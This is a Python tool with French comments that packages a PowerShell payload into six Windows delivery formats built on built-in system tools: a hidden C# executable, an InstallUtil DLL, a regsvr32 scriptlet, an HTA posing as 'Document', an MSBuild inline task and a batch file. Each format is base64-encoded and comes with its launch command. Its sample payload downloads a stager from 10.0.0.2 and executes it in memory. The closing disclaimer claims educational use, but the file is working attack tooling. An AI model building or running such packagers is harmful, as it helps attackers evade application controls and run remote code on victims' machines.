#!/usr/bin/env python3
"""
Packaging Module - Mécanismes Natifs Windows et Légitimes
Utilise uniquement des outils Microsoft natifs (csc.exe, InstallUtil.exe, etc.)
"""

import os
import subprocess
import base64

class PayloadPackager:
    """Packaging avec outils natifs Windows"""
    
    def __init__(self, output_dir="payloads/packaged/"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(os.path.join(output_dir, "src"), exist_ok=True)
    
    # ═══════════════════════════════════════════════════════
    # 1️⃣ COMPILATION C# AVEC CSC.EXE
    # ═══════════════════════════════════════════════════════
    
    def csharp_executable(self, payload_cmd, name="payload"):
        """Compile un exécutable C# avec csc.exe"""
        cs_code = f"""
using System;
using System.Diagnostics;

namespace PayloadRunner {{
    class Program {{
        static void Main(string[] args) {{
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \\"{payload_cmd}\\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }}
    }}
}}
"""
        cs_file = os.path.join(self.output_dir, "src", f"{name}.cs")
        exe_file = os.path.join(self.output_dir, f"{name}.exe")
        
        with open(cs_file, "w") as f:
            f.write(cs_code)
        
        # Compilation avec csc.exe
        csc_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        cmd = [csc_path, "/out:" + exe_file, cs_file]
        
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"[+] EXE compilé: {exe_file}")
            return exe_file
        except subprocess.CalledProcessError as e:
            print(f"[-] Erreur compilation: {e.stderr.decode()}")
            return None
    
    # ═══════════════════════════════════════════════════════
    # 2️⃣ DLL .NET AVEC INSTALLUTIL.EXE
    # ═══════════════════════════════════════════════════════
    
    def installutil_dll(self, ps_payload, name="payload"):
        """Crée une DLL .NET exploitable par InstallUtil.exe"""
        b64_payload = base64.b64encode(ps_payload.encode("utf-16le")).decode()
        
        cs_code = f"""
using System;
using System.Management.Automation;
using System.Configuration.Install;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer {{
    public override void Uninstall(System.Collections.IDictionary savedState) {{
        string payload = "{b64_payload}";
        byte[] bytes = Convert.FromBase64String(payload);
        string decoded = System.Text.Encoding.Unicode.GetString(bytes);
        
        using (PowerShell ps = PowerShell.Create()) {{
            ps.AddScript(decoded);
            ps.Invoke();
        }}
    }}
}}
"""
        cs_file = os.path.join(self.output_dir, "src", f"{name}.cs")
        dll_file = os.path.join(self.output_dir, f"{name}.dll")
        
        with open(cs_file, "w") as f:
            f.write(cs_code)
        
        # Compilation en DLL
        csc_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        cmd = [
            csc_path,
            "/target:library",
            "/out:" + dll_file,
            "/reference:System.Management.Automation.dll",
            "/reference:System.Configuration.Install.dll",
            cs_file
        ]
        
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"[+] DLL InstallUtil créée: {dll_file}")
            print(f"    Usage: InstallUtil.exe /logfile= /LogToConsole=false /U {dll_file}")
            return dll_file
        except subprocess.CalledProcessError as e:
            print(f"[-] Erreur compilation DLL: {e.stderr.decode()}")
            return None
    
    # ═══════════════════════════════════════════════════════
    # 3️⃣ SCRIPTS SCT (REGSVR32)
    # ═══════════════════════════════════════════════════════
    
    def regsvr32_sct(self, ps_payload, name="payload.sct"):
        """Génère un fichier SCT pour regsvr32.exe"""
        b64_payload = base64.b64encode(ps_payload.encode("utf-16le")).decode()
        
        sct_code = f"""<?XML version="1.0"?>
<scriptlet>
<registration
    progid="Payload"
    classid="{{F0001111-0000-0000-0000-0000FEEDACDC}}"
    description="Payload"
    remotable="true"
    version="1.00">
</registration>

<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {b64_payload}";
    shell.Run(cmd, 0, false);
]]>
</script>
</scriptlet>
"""
        sct_file = os.path.join(self.output_dir, name)
        with open(sct_file, "w") as f:
            f.write(sct_code)
        
        print(f"[+] SCT généré: {sct_file}")
        print(f"    Usage: regsvr32.exe /s /u /i:{sct_file} scrobj.dll")
        return sct_file
    
    # ═══════════════════════════════════════════════════════
    # 4️⃣ HTA AVANCÉ (MSHTA.EXE)
    # ═══════════════════════════════════════════════════════
    
    def mshta_hta(self, ps_payload, name="payload.hta"):
        """Génère un fichier HTA pour mshta.exe"""
        b64_payload = base64.b64encode(ps_payload.encode("utf-16le")).decode()
        
        hta_code = f"""<!DOCTYPE html>
<html>
<head>
<title>Document</title>
<HTA:APPLICATION
    APPLICATIONNAME="Document"
    SCROLL="no"
    SINGLEINSTANCE="yes">
</head>
<body>
<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    cmd = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {b64_payload}"
    objShell.Run cmd, 0, False
    window.close()
</script>
</body>
</html>
"""
        hta_file = os.path.join(self.output_dir, name)
        with open(hta_file, "w") as f:
            f.write(hta_code)
        
        print(f"[+] HTA généré: {hta_file}")
        print(f"    Usage: mshta.exe {hta_file}")
        return hta_file
    
    # ═══════════════════════════════════════════════════════
    # 5️⃣ MSBUILD XML
    # ═══════════════════════════════════════════════════════
    
    def msbuild_xml(self, ps_payload, name="payload.xml"):
        """Génère un fichier XML pour MSBuild.exe"""
        b64_payload = base64.b64encode(ps_payload.encode("utf-16le")).decode()
        
        xml_code = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        
        public class ClassExample : Task, ITask
        {{
          public override bool Execute()
          {{
            string cmd = "powershell.exe -NoProfile -EncodedCommand {b64_payload}";
            System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
            return true;
          }}
        }}
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"""
        xml_file = os.path.join(self.output_dir, name)
        with open(xml_file, "w") as f:
            f.write(xml_code)
        
        print(f"[+] MSBuild XML généré: {xml_file}")
        print(f"    Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {xml_file}")
        return xml_file
    
    # ═══════════════════════════════════════════════════════
    # 6️⃣ BATCH FILE WRAPPER
    # ═══════════════════════════════════════════════════════
    
    def batch_wrapper(self, ps_payload, name="payload.bat"):
        """Crée un wrapper BAT"""
        b64_payload = base64.b64encode(ps_payload.encode("utf-16le")).decode()
        
        bat_code = f"""@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {b64_payload}
"""
        bat_file = os.path.join(self.output_dir, name)
        with open(bat_file, "w") as f:
            f.write(bat_code)
        
        print(f"[+] BAT wrapper créé: {bat_file}")
        return bat_file


# ═══════════════════════════════════════════════════════
# EXEMPLE D'UTILISATION
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    pkg = PayloadPackager()
    
    # Payload PowerShell de test
    test_payload = """
    $client = New-Object Net.WebClient;
    $data = $client.DownloadString('http://10.0.0.2/stager.ps1');
    IEX $data;
    """
    
    print("\n📦 PACKAGING CONTRÔLÉ - OUTILS NATIFS WINDOWS\n")
    
    # Générer tous les formats
    pkg.csharp_executable(test_payload, "payload_exe")
    pkg.installutil_dll(test_payload, "payload_dll")
    pkg.regsvr32_sct(test_payload, "payload.sct")
    pkg.mshta_hta(test_payload, "payload.hta")
    pkg.msbuild_xml(test_payload, "payload.xml")
    pkg.batch_wrapper(test_payload, "payload.bat")
    
    print("\n✅ Tous les payloads packagés générés dans payloads/packaged/")
    print("⚠️  RAPPEL: Ces techniques sont documentées publiquement (LOLBAS)")
    print("⚠️  Usage strictement éducatif et défensif uniquement")
